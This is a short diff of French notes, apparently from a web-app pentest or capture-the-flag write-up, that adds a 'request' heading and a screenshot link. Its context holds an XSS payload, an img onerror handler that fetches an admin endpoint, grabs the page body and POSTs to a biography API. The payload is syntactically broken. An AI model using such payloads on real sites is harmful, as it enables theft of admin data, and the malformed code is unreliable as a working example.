@@ -41,9 +41,17 @@ Possibilité de request POST et de poster le contenu de fichier sensible.
 
 
 
+requête : 
+
+![](../../Pasted%20image%2020260518230549.png)
+
+
+
 
 ```javascript
 <img src="x" onerror="fetch('/api/admin/log-visit').then(() => {var content = document.body.innerHTML} , fetch('/api/biography' , {method: 'POST', headers:{'Content-Type' : 'application/json', body: JSON.stringify({ u_id: 1 }) ;>
 
 ```
+
+
 
